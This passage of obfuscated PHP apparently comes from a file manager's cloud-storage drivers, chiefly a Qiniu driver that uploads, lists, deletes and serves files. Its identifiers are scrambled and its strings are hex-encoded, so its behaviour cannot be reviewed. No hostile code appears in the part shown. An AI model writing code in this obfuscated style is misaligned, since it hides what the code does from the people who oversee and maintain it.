$Ö¾ˆ‡æ¡ ? $Ò‚î´µ® : $îÆ”Ô[12]; } return isset($¬™¿¤ñ[$îÆ”Ô[1436]]) ? strtolower($¬™¿¤ñ[$îÆ”Ô[1436]]) : $îÆ”Ô[12]; } public function size($–©—Ã¥ö) { $‰ÖÄ¿Ô‡ = $this->objectMeta($–©—Ã¥ö); return $‰ÖÄ¿Ô‡ ? $‰ÖÄ¿Ô‡[$_SERVER[ò«¥Ê‡å][78]] : 0; } public function info($ÁÏ†ÁèÑ) { if ($this->isFolder($ÁÏ†ÁèÑ)) { return $this->folderInfo($ÁÏ†ÁèÑ); } else { if ($this->isFile($ÁÏ†ÁèÑ)) { return $this->fileInfo($ÁÏ†ÁèÑ); } } return !1; } public function exist($å¹âú•ˆ) { return $this->isFile($å¹âú•ˆ) || $this->isFolder($å¹âú•ˆ); } public function isFile($½À¥ÏÀõ) { return !$this->isFolder($½À¥ÏÀõ) && $this->objectMeta($½À¥ÏÀõ); } public function isFolder($˜íáÒğ¦) { return $this->cacheMethod($_SERVER[ò«¥Ê‡å][168], $˜íáÒğ¦); } protected function objectMeta($‘ ùöà) { return $this->cacheMethod($_SERVER[ò«¥Ê‡å][170], $‘ ùöà); } protected function _objectMeta($ı¥İ‡Äí) { $“²©×‰ =& $_SERVER[ò«¥Ê‡å]; try { $†‘ìŒš¼ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($ı¥İ‡Äí)); } catch (OSS\Core\OssException $ÕÍ¾ä®) { $†‘ìŒš¼ = !1; } if ($†‘ìŒš¼) { $†‘ìŒš¼[$“²©×‰[78]] = intval($†‘ìŒš¼[$“²©×‰[1434]]); } return $†‘ìŒš¼; } protected function _isFolder($ÛÃ×ùü) { $öìüïİÖ =& $_SERVER[ò«¥Ê‡å]; if ($ÛÃ×ùü == $öìüïİÖ[12] || $ÛÃ×ùü == $öìüïİÖ[8]) { return !0; } $‹»ì”› = array($öìüïİÖ[1429] => $öìüïİÖ[8], $öìüïİÖ[1430] => rtrim($ÛÃ×ùü, $öìüïİÖ[8]) . $öìüïİÖ[8], $öìüïİÖ[1431] => 1, $öìüïİÖ[1432] => $öìüïİÖ[12]); $”Õ¸¥ã = $this->client->listObjects($this->bucket, $‹»ì”›); if ($”Õ¸¥ã->getObjectList() || $”Õ¸¥ã->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($×œ¾É›) { parent::__construct(); require_once SDK_DIR . $_SERVER[ò«¥Ê‡å][1460]; $this->_init($×œ¾É›); } public function _init($î™ßÂ÷ä) { $º×ƒÃæ§ =& $_SERVER[ò«¥Ê‡å]; $this->config = $î™ßÂ÷ä; foreach ($î™ßÂ÷ä as $œ´¿ë€Å => $Ïí›ÍŞÓ) { if (isset($this->{$œ´¿ë€Å})) { $this->{$œ´¿ë€Å} = $Ïí›ÍŞÓ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($º×ƒÃæ§[1461] . LNG($º×ƒÃæ§[1420])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($é÷æ¸ê¾, $ÅÎƒâ· = '', $şº»â·Ù = REPEAT_RENAME) { if ($this->setContent($é÷æ¸ê¾, $ÅÎƒâ·)) { return $this->getPathOuter($é÷æ¸ê¾); } return !1; } public function mkdir($Ê¹¼’œÀ, $Ùïê¤Áì = REPEAT_SKIP) { $¢ä£™‡ä =& $_SERVER[ò«¥Ê‡å]; $»¨Ù—À = trim($Ê¹¼’œÀ, $¢ä£™‡ä[8]); if ($this->_isFolder($»¨Ù—À)) { return $this->getPathOuter($»¨Ù—À); } $Ê¹¼’œÀ = $»¨Ù—À . $¢ä£™‡ä[8]; $—İóî× = get_path_this($»¨Ù—À); $ê×è¡ÉÀ = $Ê¹¼’œÀ . $—İóî×; if (!$this->mkfile($ê×è¡ÉÀ)) { return !1; } if (!$this->moveFile($ê×è¡ÉÀ, $Ê¹¼’œÀ)) { $this->delFile($ê×è¡ÉÀ); return !1; } return $this->getPathOuter($»¨Ù—À); } public function copyFile($Äõñê·•, $»Á±û˜Æ) { $ª·å°Â­ = $this->bucketManager->copy($this->bucket, $Äõñê·•, $this->bucket, $»Á±û˜Æ, !0); return $ª·å°Â­ ? !1 : $this->getPathOuter($»Á±û˜Æ); } public function moveFile($±Ã€œ, $Õ²Á›…‹) { $¤„ƒîûû = $this->bucketManager->move($this->bucket, $±Ã€œ, $this->bucket, $Õ²Á›…‹, !0); return $¤„ƒîûû ? !1 : $this->getPathOuter($Õ²Á›…‹); } public function delFile($Ğ³›Ü‡À) { if (!$this->exist($Ğ³›Ü‡À)) { return !0; } $ÆÂñ¿’Ü = $this->bucketManager->delete($this->bucket, $Ğ³›Ü‡À); return $ÆÂñ¿’Ü ? !1 : !0; } public function delFolder($ı–Î˜ü) { $¯‹Œ˜ =& $_SERVER[ò«¥Ê‡å]; if (!$this->exist($ı–Î˜ü)) { return !0; } $this->listItemCache = !1; $ì—æÑ˜· = $this->fileList($ı–Î˜ü); $this->listItemCache = !0; $¥ğ‰àĞ× = trim($ı–Î˜ü, $¯‹Œ˜[8]) . $¯‹Œ˜[8]; if (!empty($ı–Î˜ü) && $ı–Î˜ü !== $¯‹Œ˜[214] && !in_array($¥ğ‰àĞ×, $ì—æÑ˜·[$¯‹Œ˜[84]])) { $ì—æÑ˜·[$¯‹Œ˜[84]][] = $¥ğ‰àĞ×; } $ó¿æØ†± = $this->delByBatch($ì—æÑ˜·[$¯‹Œ˜[85]]); if (!$ó¿æØ†±) { return !1; } $ó¿æØ†± = $this->delByBatch($ì—æÑ˜·[$¯‹Œ˜[84]]); if (!$ó¿æØ†±) { return !1; } return $this->delFile($¥ğ‰àĞ×); } private function delByBatch($­„–¨—) { foreach (array_chunk($­„–¨—, 1000) as $“¥±â÷¨) { $ŞŞÄîÍ¡ = $this->bucketManager->buildBatchDelete($this->bucket, $“¥±â÷¨); list($ÓÓÖÍÂ‘, $´˜Èû©) = $this->bucketManager->batch($ŞŞÄîÍ¡); if ($´˜Èû©) { return !1; } } return !0; } public function rename($Úìä³ë , $¡ñ§©ÃØ) { return $this->renameObject($Úìä³ë , $¡ñ§©ÃØ); } public function fileInfo($Ã–´î„ò, $Ã¤ÌÌçÊ = false, $°šˆ›§Ù = array()) { $ò½İßŸû =& $_SERVER[ò«¥Ê‡å]; $ÚÛÃ—¿ô = array($ò½İßŸû[32] => $this->pathThis($Ã–´î„ò), $ò½İßŸû[86] => $this->getPathOuter($ò½İßŸû[8] . $Ã–´î„ò), $ò½İßŸû[33] => $ò½İßŸû[216], $ò½İßŸû[78] => isset($°šˆ›§Ù[$ò½İßŸû[1462]]) ? $°šˆ›§Ù[$ò½İßŸû[1462]] : 0, $ò½İßŸû[177] => $this->ext($Ã–´î„ò)); if ($Ã¤ÌÌçÊ) { return $ÚÛÃ—¿ô; } $ÚÛÃ—¿ô[$ò½İßŸû[217]] = $ÚÛÃ—¿ô[$ò½İßŸû[87]] = 0; $ÚÛÃ—¿ô[$ò½İßŸû[218]] = $ÚÛÃ—¿ô[$ò½İßŸû[219]] = !0; if (empty($°šˆ›§Ù)) { $°šˆ›§Ù = $this->objectMeta($Ã–´î„ò); if (!$°šˆ›§Ù) { return $ÚÛÃ—¿ô; } } if (isset($°šˆ›§Ù[$ò½İßŸû[220]]) && $°šˆ›§Ù[$ò½İßŸû[220]]) { $ÚÛÃ—¿ô[$ò½İßŸû[221]] = $°šˆ›§Ù[$ò½İßŸû[220]]; } if (isset($°šˆ›§Ù[$ò½İßŸû[230]]) && $°šˆ›§Ù[$ò½İßŸû[230]]) { $ÚÛÃ—¿ô[$ò½İßŸû[221]] = $°šˆ›§Ù[$ò½İßŸû[230]]; } if (isset($°šˆ›§Ù[$ò½İßŸû[1463]])) { $ÚÛÃ—¿ô[$ò½İßŸû[87]] = substr($°šˆ›§Ù[$ò½İßŸû[1463]] . $ò½İßŸû[12], 0, 10); } if (isset($°šˆ›§Ù[$ò½İßŸû[1462]])) { $ÚÛÃ—¿ô[$ò½İßŸû[78]] = $°šˆ›§Ù[$ò½İßŸû[1462]]; } return $ÚÛÃ—¿ô; } public function folderInfo($—å¹Êî, $äìÈ†¤³ = false) { $‘éÛ¯ì‡ =& $_SERVER[ò«¥Ê‡å]; $öğ¾˜’Î = array($‘éÛ¯ì‡[32] => $this->pathThis($—å¹Êî), $‘éÛ¯ì‡[86] => $this->getPathOuter($‘éÛ¯ì‡[8] . $—å¹Êî), $‘éÛ¯ì‡[33] => $‘éÛ¯ì‡[77]); if ($äìÈ†¤³) { return $öğ¾˜’Î; } $öğ¾˜’Î[$‘éÛ¯ì‡[217]] = $öğ¾˜’Î[$‘éÛ¯ì‡[87]] = 0; $öğ¾˜’Î[$‘éÛ¯ì‡[218]] = $öğ¾˜’Î[$‘éÛ¯ì‡[219]] = !0; $—å¹Êî = rtrim($—å¹Êî, $‘éÛ¯ì‡[8]) . $‘éÛ¯ì‡[8]; $Üô‹‘Û÷ = $this->objectMeta($—å¹Êî); if (isset($Üô‹‘Û÷[$‘éÛ¯ì‡[1463]])) { $öğ¾˜’Î[$‘éÛ¯ì‡[87]] = substr($Üô‹‘Û÷[$‘éÛ¯ì‡[1463]] . $‘éÛ¯ì‡[12], 0, 10); } return $öğ¾˜’Î; } public function listPath($œ™úœ¹é, $ï×•àÌ§ = false) { $µ«‰¾Ùˆ =& $_SERVER[ò«¥Ê‡å]; $«ŞÍâóÔ = $this->fileList($œ™úœ¹é, $µ«‰¾Ùˆ[8], !0); foreach ($«ŞÍâóÔ[$µ«‰¾Ùˆ[84]] as $ç ±¾ÒÒ => $”øÛ„Å¢) { $«ŞÍâóÔ[$µ«‰¾Ùˆ[84]][$ç ±¾ÒÒ] = $this->folderInfo($”øÛ„Å¢, $ï×•àÌ§); } foreach ($«ŞÍâóÔ[$µ«‰¾Ùˆ[85]] as $ç ±¾ÒÒ => $”øÛ„Å¢) { $«ŞÍâóÔ[$µ«‰¾Ùˆ[85]][$ç ±¾ÒÒ] = $this->fileInfo($”øÛ„Å¢[$µ«‰¾Ùˆ[96]], $ï×•àÌ§, $”øÛ„Å¢); } return $«ŞÍâóÔ; } public function has($„Ë…Ï÷», $€›Ñ§İ = false, $é›Ë“­ğ = true) { $®î‚©¢“ =& $_SERVER[ò«¥Ê‡å]; $„Ë…Ï÷» = trim($„Ë…Ï÷», $®î‚©¢“[8]); $§à¥¨Ø¢ = empty($„Ë…Ï÷») && $„Ë…Ï÷» !== $®î‚©¢“[214] ? $®î‚©¢“[12] : $„Ë…Ï÷» . $®î‚©¢“[8]; $„“â¿Îº = $®î‚©¢“[12]; $¨ï¦—° = 500; $Ïƒ¾é±î = $®î‚©¢“[8]; $ËÃ‹™…’ = $Ø¹ïµäİ = 0; while (!0) { check_abort(); list($ªæİÆâº, $ÃâòİŸã) = $this->bucketManager->listFiles($this->bucket, $§à¥¨Ø¢, $„“â¿Îº, $¨ï¦—°, $Ïƒ¾é±î); if ($ÃâòİŸã) { break; } $„“â¿Îº = array_key_exists($®î‚©¢“[1432], $ªæİÆâº) ? $„“â¿Îº = $ªæİÆâº[$®î‚©¢“[1464]] : $®î‚©¢“[12]; if ($€›Ñ§İ) { if (!empty($ªæİÆâº[$®î‚©¢“[1465]])) { $ËÃ‹™…’ += count($ªæİÆâº[$®î‚©¢“[1465]]); } if (!empty($ªæİÆâº[$®î‚©¢“[1466]])) { $Ø¹ïµäİ += count($ªæİÆâº[$®î‚©¢“[1466]]); } if ($„“â¿Îº === $®î‚©¢“[12]) { break; } continue; } if ($é›Ë“­ğ) { if (!empty($ªæİÆâº[$®î‚©¢“[1465]])) { return !0; } } else { if (!empty($ªæİÆâº[$®î‚©¢“[1466]])) { return !0; } } if ($„“â¿Îº === $®î‚©¢“[12]) { break; } } if ($€›Ñ§İ) { return array($®î‚©¢“[225] => $ËÃ‹™…’, $®î‚©¢“[226] => $Ø¹ïµäİ); } return !1; } public function listAll($şÑ‰»šÀ) { $®õì”üî =& $_SERVER[ò«¥Ê‡å]; $§øƒë×× = $this->fileList($şÑ‰»šÀ, $®õì”üî[12], !0); $Ç¿·µ®Ñ = array_to_keyvalue($§øƒë××[$®õì”üî[85]], $®õì”üî[32]); foreach ($§øƒë××[$®õì”üî[84]] as $ÉŒ´ƒ‹ä) { if (is_string($ÉŒ´ƒ‹ä)) { $Ç¿·µ®Ñ[$ÉŒ´ƒ‹ä] = array($®õì”üî[78] => 0); } } return $this->listAllFiles($şÑ‰»šÀ, $Ç¿·µ®Ñ); } private function fileList($³©Ü‡¯€, $—™£Ö×÷ = '', $¸üÑÔÈ¤ = 0) { $¿À™Ÿà =& $_SERVER[ò«¥Ê‡å]; $³©Ü‡¯€ = trim($³©Ü‡¯€, $¿À™Ÿà[8]); $©Ç¾ÂÅÜ = empty($³©Ü‡¯€) && $³©Ü‡¯€ !== $¿À™Ÿà[214] ? $¿À™Ÿà[12] : $³©Ü‡¯€ . $¿À™Ÿà[8]; $³óÔ“ºÄ = $¿À™Ÿà[12]; $½ÇÕÈ­ß = 1000; $Ç©¸ = $©á—³œ = array(); while (!0) { check_abort(); list($Ò´ü–ÑÒ, $ÒËÁ§¡) = $this->bucketManager->listFiles($this->bucket, $©Ç¾ÂÅÜ, $³óÔ“ºÄ, $½ÇÕÈ­ß, $—™£Ö×÷); if ($ÒËÁ§¡) { break; } $³óÔ“ºÄ = array_key_exists($¿À™Ÿà[1432], $Ò´ü–ÑÒ) ? $³óÔ“ºÄ = $Ò´ü–ÑÒ[$¿À™Ÿà[1464]] : $¿À™Ÿà[12]; $é»ÖËÉ = isset($Ò´ü–ÑÒ[$¿À™Ÿà[1465]]) ? $Ò´ü–ÑÒ[$¿À™Ÿà[1465]] : array(); $¿‹Åğ•¨ = isset($Ò´ü–ÑÒ[$¿À™Ÿà[1466]]) ? $Ò´ü–ÑÒ[$¿À™Ÿà[1466]] : array(); foreach ($é»ÖËÉ as $¶Ù•š÷) { if ($¶Ù•š÷[$¿À™Ÿà[96]] == $©Ç¾ÂÅÜ) { continue; } $‰Ğ˜í² = $¶Ù•š÷[$¿À™Ÿà[96]]; $³·»£ß« = $¶Ù•š÷[$¿À™Ÿà[1462]]; $¶Ù•š÷[$¿À™Ÿà[78]] = $³·»£ß«; $µ©»ö“ = $³·»£ß« == 0 && substr($‰Ğ˜í², strlen($‰Ğ˜í²) - 1, 1) == $¿À™Ÿà[8] ? !0 : !1; $this->cacheMethodInfoSet($‰Ğ˜í², $µ©»ö“, $¶Ù•š÷); if ($µ©»ö“) { $Ç©¸[] = $‰Ğ˜í²; continue; } $©á—³œ[] = $¸üÑÔÈ¤ ? $¶Ù•š÷ : $‰Ğ˜í²; } foreach ($¿‹Åğ•¨ as $‰Ğ˜í²) { if ($‰Ğ˜í² == $©Ç¾ÂÅÜ) { continue; } $Ç©¸[] = $‰Ğ˜í²; $this->cacheMethodInfoSet($‰Ğ˜í², !0); } if ($³óÔ“ºÄ === $¿À™Ÿà[12]) { break; } } $this->cacheMethodInfoSet($³©Ü‡¯€, !0); return array($¿À™Ÿà[84] => $Ç©¸, $¿À™Ÿà[85] => $©á—³œ); } public function canRead($ŠşË—‚Ù) { return $this->exist($ŠşË—‚Ù) ? !0 : !1; } public function canWrite($‰›ìˆµ±) { return $this->exist($‰›ìˆµ±) ? !0 : !1; } public function getContent($´ÇğÄ¾) { return $this->fileSubstr($´ÇğÄ¾, 0, -1); } public function setContent($±½°—şç, $´…¶¦²º = '') { $°ÒğŠ¤ = $this->tempFile($this->pathThis($±½°—şç)); file_put_contents($°ÒğŠ¤, $´…¶¦²º); if ($this->upload($±½°—şç, $°ÒğŠ¤)) { $this->tempFileRemve($°ÒğŠ¤); return !0; } return !1; } public function refreshUrls($Ç•¹÷¿Ö) { $«‚ºÎŠ  =& $_SERVER[ò«¥Ê‡å]; $Óû¤…Å = array(); if (is_array($Ç•¹÷¿Ö)) { foreach ($Ç•¹÷¿Ö as $¡Ö·óş) { $Óû¤…Å[] = $this->link($¡Ö·óş); } } else { $Óû¤…Å[] = $this->link($Ç•¹÷¿Ö); } $±ßÕ²ÆÎ = new Qiniu\Cdn\CdnManager($this->auth); list($áÍöÈ¯, $ê¾‚¢) = $±ßÕ²ÆÎ->refreshUrls($Óû¤…Å); if ($ê¾‚¢) { return !1; } return $áÍöÈ¯[$«‚ºÎŠ [1229]] == $«‚ºÎŠ [798] ? !0 : !1; } public function fileSubstr($÷×ŸÌ¹£, $Î“ ªéÒ, $ï¾¡×”) { $îı ©Í =& $_SERVER[ò«¥Ê‡å]; if (!($İ¦†µ· = $this->link($÷×ŸÌ¹£))) { return !1; } $§¨Œ¡ç¶ = !1; if ($ï¾¡×” > 0) { $™º‰ã¼à = $Î“ ªéÒ + $ï¾¡×” - 1; $§¨Œ¡ç¶ = array($îı ©Í[1467] . $Î“ ªéÒ . $îı ©Í[432] . $™º‰ã¼à); } $ÇùÙ¸¹ö = url_request($İ¦†µ·, $îı ©Í[247], !1, $§¨Œ¡ç¶); return $ÇùÙ¸¹ö[$îı ©Í[789]] ? $ÇùÙ¸¹ö[$îı ©Í[1249]] : !1; } public function upload($¡Æ¿±·, $ç­İšª™, $İ«šÍ—ú = false, $±Íı¶Ç‹ = REPEAT_REPLACE) { $ûĞ¾ôè‹ = new Qiniu\Storage\UploadManager(); $Á‹ó÷¨ = $this->auth->uploadToken($this->bucket, $¡Æ¿±·); $ì²”í‰ß = get_file_mime(get_path_ext($ç­İšª™)); list($†êÁÎî‹, $ÙØåé§ô) = $ûĞ¾ôè‹->putFile($Á‹ó÷¨, $¡Æ¿±·, $ç­İšª™, null, $ì²”í‰ß); return $ÙØåé§ô ? !1 : $this->getPathOuter($¡Æ¿±·); } public function uploadFormData($–ø†Áš, $·‘¸ù¨ = 3600) { return $this->uploadToken($–ø†Áš, $·‘¸ù¨); } public function multiUploadFormData($ú¾Ò¿¹ú, $…Æ‹«¡ = 3600) { return $this->uploadToken($ú¾Ò¿¹ú, $…Æ‹«¡); } private function uploadToken($ÃšÂ´â, $ˆ¡­ÙÚÓ = 3600) { $¥³ü®ê =& $_SERVER[ò«¥Ê‡å]; $ÛÆ«úŞ“ = $ˆ¡­ÙÚÓ; $«’¿†® = array($¥³ü®ê[1468] => $¥³ü®ê[1469]); $¬ÂÜÒ± = $ÃšÂ´â; $æ²Ó™Ÿ¾ = $this->auth->uploadToken($this->bucket, $¬ÂÜÒ±, $ÛÆ«úŞ“, $«’¿†®, !0); $æ÷Ÿúé‘ = empty($this->region) || $this->region == $¥³ü®ê[1470] ? $¥³ü®ê[12] : $¥³ü®ê[432] . $this->region; $šóÑãşü = http_type() . "\x3a\x2f\x2f\x75\x70\x6c\x6f\141\x64{$æ÷Ÿúé‘}\56\x71\151\x6e\151\165\160\x2e\x63\157\x6d\57"; return array($¥³ü®ê[1471] => $æ²Ó™Ÿ¾, $¥³ü®ê[1472] => $šóÑãşü); } public function download($Ä›ÉÛçª, $ø‹¥ÑÇ) { $‹À¥ ç = IO::getPathInner(IO::mkfile($ø‹¥ÑÇ)); if (!($‘»ÖéÀĞ = $this->link($Ä›ÉÛçª))) { return !1; } $£½Š½ğ² = 0; $„÷Çâ” = 1024 * 200; $ó¡è®Æ = fopen($‹À¥ ç, $_SERVER[ò«¥Ê‡å][1473]); while (!0) { $›ÜÇ§½ = $this->fileSubstr($Ä›ÉÛçª, $£½Š½ğ², $„÷Çâ”); if ($›ÜÇ§½ === !1) { return !1; } fwrite($ó¡è®Æ, $›ÜÇ§½); $£½Š½ğ² += $„÷Çâ”; if (strlen($›ÜÇ§½) < $„÷Çâ”) { break; } } fclose($ó¡è®Æ); return $ø‹¥ÑÇ; } public function link($‡óÓÄÆ, $ˆ¡äªú = '') { if (!$this->isFile($‡óÓÄÆ)) { return !1; } $„¬ Ïë¾ = $this->getHost() . $_SERVER[ò«¥Ê‡å][8] . $this->pathEncode($‡óÓÄÆ) . $ˆ¡äªú; return $this->auth->privateDownloadUrl($„¬ Ïë¾, 3600 * 12); } public function fileOut($ÛÂÄÀñµ, $“ª¦Æİ = false, $‹ø÷İòœ = false, $›ûÂÚÊö = '') { $ ãã™Ã =& $_SERVER[ò«¥Ê‡å]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÛÂÄÀñµ, $“ª¦Æİ, $‹ø÷İòœ, $›ûÂÚÊö); } if (!$‹ø÷İòœ) { $‹ø÷İòœ = $this->pathThis($ÛÂÄÀñµ); } $ä»ıëŸŸ = $“ª¦Æİ ? $ ãã™Ã[1474] . rawurlencode($‹ø÷İòœ) : $ ãã™Ã[12]; $Ëş‰‹ÃÁ = $this->link($ÛÂÄÀñµ, $ä»ıëŸŸ); $this->fileOutLink($Ëş‰‹ÃÁ); } public function fileOutServer($Û´ÌÚı§, $ŒïÌïæ¯ = false, $×È¹ò© = false, $ğùóµÍÛ = '') { parent::fileOut($Û´ÌÚı§, $ŒïÌïæ¯, $×È¹ò©, $ğùóµÍÛ); } public function fileOutImage($…·ÃÅ¿ , $·Ÿ£§àô = 250) { $«øÍ÷£ = $this->link($…·ÃÅ¿ , $_SERVER[ò«¥Ê‡å][1475] . $·Ÿ£§àô); $this->fileOutLink($«øÍ÷£); } public function fileOutImageServer($÷âª€ì„, $æâ€üÚ¸ = 250) { parent::fileOutImage($÷âª€ì„, $æâ€üÚ¸); } public function hashMd5($ÀêòÛØÌ) { $òš˜·ı =& $_SERVER[ò«¥Ê‡å]; $„ç¿·ºï = $this->objectMeta($ÀêòÛØÌ); return isset($„ç¿·ºï[$òš˜·ı[230]]) ? $„ç¿·ºï[$òš˜·ı[230]] : !1; $ĞˆË„Úİ = $this->link($ÀêòÛØÌ, $òš˜·ı[1476]); } public function size($¦ùø‡“) { $âª©ó†À = $this->objectMeta($¦ùø‡“); return $âª©ó†À ? $âª©ó†À[$_SERVER[ò«¥Ê‡å][78]] : 0; } public function info($Ò‘ËÜ˜) { if ($this->isFolder($Ò‘ËÜ˜)) { return $this->folderInfo($Ò‘ËÜ˜); } else { if ($this->isFile($Ò‘ËÜ˜)) { return $this->fileInfo($Ò‘ËÜ˜); } } return !1; } public function exist($«¡‰¥•×) { return $this->isFile($«¡‰¥•×) || $this->isFolder($«¡‰¥•×); } public function isFile($È¸ª’†) { return !$this->isFolder($È¸ª’†) && $this->objectMeta($È¸ª’†); } public function isFolder($ó²ËÙÒ†) { return $this->cacheMethod($_SERVER[ò«¥Ê‡å][168], $ó²ËÙÒ†); } protected function objectMeta($ª ™ŞÇ) { return $this->cacheMethod($_SERVER[ò«¥Ê‡å][170], $ª ™ŞÇ); } protected function _objectMeta($å šËŠş) { $ÍËÍ¹ =& $_SERVER[ò«¥Ê‡å]; list($Şî´„Åå, $Ãúìõî’) = $this->bucketManager->stat($this->bucket, $å šËŠş); if ($Şî´„Åå) { $Şî´„Åå[$ÍËÍ¹[78]] = intval($Şî´„Åå[$ÍËÍ¹[1462]]); } return $Şî´„Åå; } protected function _isFolder($áŞ·¸) { $Æƒ½ã´Ö =& $_SERVER[ò«¥Ê‡å]; if ($áŞ·¸ == $Æƒ½ã´Ö[12] || $áŞ·¸ == $Æƒ½ã´Ö[8]) { return !0; } list($¯Ø¥÷¾‡, $‰åéÜÅÇ) = $this->bucketManager->listFiles($this->bucket, trim($áŞ·¸, $Æƒ½ã´Ö[8]) . $Æƒ½ã´Ö[8], $Æƒ½ã´Ö[12], 1, $Æƒ½ã´Ö[8]); return !empty($¯Ø¥÷¾‡[$Æƒ½ã´Ö[1465]]) || !empty($¯Ø¥÷¾‡[$Æƒ½ã´Ö[1466]]) ? !0 : !1; } } goto BùËÅÌÇœ¿; Cø•‰½¦é: class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\56\x73\x6f\165\x72\143\x65\123\145\143\x72\x65\x74\114\151\163\x74"; public $field = array("\x73\x6f\165\162\x63\145\111\104", "\x74\x79\x70\x65\111\x44", "\143\x72\145\x61\164\145\125\163\145\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\x2e\x73\164\157\x72\141\x67\145\x4c\x69\x73\x74"; public $field = array("\156\x61\x6d\145", "\163\151\172\x65\x4d\x61\x78", "\163\x79\x73\x74\145\x6d", "\x64\x65\146\x61\x75\154\x74", "\144\x72\x69\166\x65\162", "\x63\157\x6e\x66\x69\x67"); public function listData($—ÕØµ˜­ = false, $œòÓÈ¹‹ = "\x6d\x6f\x64\151\146\171\x54\151\155\x65", $’ü¾’¡Ø = false) { $‰¹²’ä‚ =& $_SERVER[ò«¥Ê‡å]; $ÅÖñÚÚÃ = parent::listData($—ÕØµ˜­, $œòÓÈ¹‹, $’ü¾’¡Ø); if ($—ÕØµ˜­) { return $ÅÖñÚÚÃ; } $ÃÇ‘Ì¯’ = $this->ioSizeUseGet(array_to_keyvalue($ÅÖñÚÚÃ, $‰¹²’ä‚[12], $‰¹²’ä‚[445])); foreach ($ÅÖñÚÚÃ as $­¥äûÆã => $¨ùšŞ…ü) { unset($ÅÖñÚÚÃ[$­¥äûÆã][$‰¹²’ä‚[6]]); $ÅÖñÚÚÃ[$­¥äûÆã][$‰¹²’ä‚[1888]] = isset($ÃÇ‘Ì¯’[$¨ùšŞ…ü[$‰¹²’ä‚[445]]]) ? $ÃÇ‘Ì¯’[$¨ùšŞ…ü[$‰¹²’ä‚[445]]] : 0; } return $ÅÖñÚÚÃ; } public function ioSizeUseGet($¸í‚¼šâ) { $à³ËüóÒ =& $_SERVER[ò«¥Ê‡å]; if (!$¸í‚¼šâ) { return array(); } $­†®à±© = $à³ËüóÒ[2220] . implode($à³ËüóÒ[50], $¸í‚¼šâ); $ÆÓà®» = Cache::get($­†®à±©); if ($ÆÓà®») { return $ÆÓà®»; } $³¸ØŠÉö = array($à³ËüóÒ[863] => $à³ËüóÒ[445], $à³ËüóÒ[2221] => $à³ËüóÒ[78]); $ş¼²şœÙ = array($à³ËüóÒ[863] => array($à³ËüóÒ[7], $¸í‚¼šâ)); $ÆÓà®» = Model($à³ËüóÒ[828])->field($³¸ØŠÉö)->where($ş¼²şœÙ)->group($à³ËüóÒ[863])->select(); $ÆÓà®» = array_to_keyvalue($ÆÓà®», $à³ËüóÒ[445], $à³ËüóÒ[78]); Cache::set($­†®à±©, $ÆÓà®», 600); return $ÆÓà®»; } public function getConfig($âßá’ŞÂ) { $¶—÷°Ê• = parent::listData($âßá’ŞÂ); return json_decode($¶—÷°Ê•[$_SERVER[ò«¥Ê‡å][6]], !0); } public function update($Ã–ıø¸ß, $“Ù¶ªŒÕ) { $ÕæÎ–™ =& $_SERVER[ò«¥Ê‡å]; $Ã±ó¾âÒ = $“Ù¶ªŒÕ[$ÕæÎ–™[32]]; $ÓæÚúï¶ = array_to_keyvalue(parent::listData(), $ÕæÎ–™[32]); if (isset($ÓæÚúï¶[$Ã±ó¾âÒ]) && $ÓæÚúï¶[$Ã±ó¾âÒ][$ÕæÎ–™[445]] != $Ã–ıø¸ß) { return !1; } $this->checkPwd($Ã–ıø¸ß, $“Ù¶ªŒÕ); if (isset($“Ù¶ªŒÕ[$ÕæÎ–™[2222]]) && $“Ù¶ªŒÕ[$ÕæÎ–™[2222]] == $ÕæÎ–™[90]) { $this->checkConfig($“Ù¶ªŒÕ); } unset($“Ù¶ªŒÕ[$ÕæÎ–™[2222]]); $©¡ÀêÜê = parent::update($Ã–ıø¸ß, $“Ù¶ªŒÕ); if ($©¡ÀêÜê && $“Ù¶ªŒÕ[$ÕæÎ–™[37]]) { $¹Ş¢ŠÌ° = 0; foreach ($ÓæÚúï¶ as $¯Ä±–¤) { if ($¯Ä±–¤[$ÕæÎ–™[37]] && $¯Ä±–¤[$ÕæÎ–™[445]] != $Ã–ıø¸ß) { $¹Ş¢ŠÌ° = $¯Ä±–¤[$ÕæÎ–™[445]]; parent::update($¯Ä±–¤[$ÕæÎ–™[445]], array($ÕæÎ–™[37] => 0)); } } $this->updateBackup($Ã–ıø¸ß, $¹Ş¢ŠÌ°); } return $©¡ÀêÜê; } public function add($ÕôËºúÊ) { $¯ã…Í±Ã =& $_SERVER[ò«¥Ê‡å]; $‡àù‘¹Œ = array_to_keyvalue(parent::listData(), $¯ã…Í±Ã[32]); if (isset($‡àù‘¹Œ[$ÕôËºúÊ[$¯ã…Í±Ã[32]]])) { return !1; } $this->checkConfig($ÕôËºúÊ); $œ¡‰¶¸ = parent::insert($ÕôËºúÊ); if ($œ¡‰¶¸ && $ÕôËºúÊ[$¯ã…Í±Ã[37]]) { foreach ($‡àù‘¹Œ as $–Ğ¥€ëÃ) { if ($–Ğ¥€ëÃ[$¯ã…Í±Ã[37]]) { parent::update($–Ğ¥€ëÃ[$¯ã…Í±Ã[445]], array($¯ã…Í±Ã[37] => 0)); } } } return $œ¡‰¶¸; } public function updateBackup($¡Şõ¬ô•, $‚­å¹Üš) { $ÓŸª¢ö =& $_SERVER[ò«¥Ê‡å]; if (!$‚­å¹Üš) { return; } $±ë¨¾ä = Model($ÓŸª¢ö[788])->config(); if ($±ë¨¾ä[$ÓŸª¢ö[1671]] != $ÓŸª¢ö[90] || $±ë¨¾ä[$ÓŸª¢ö[790]] != $‚­å¹Üš) { return; } $¾â“ ©í = 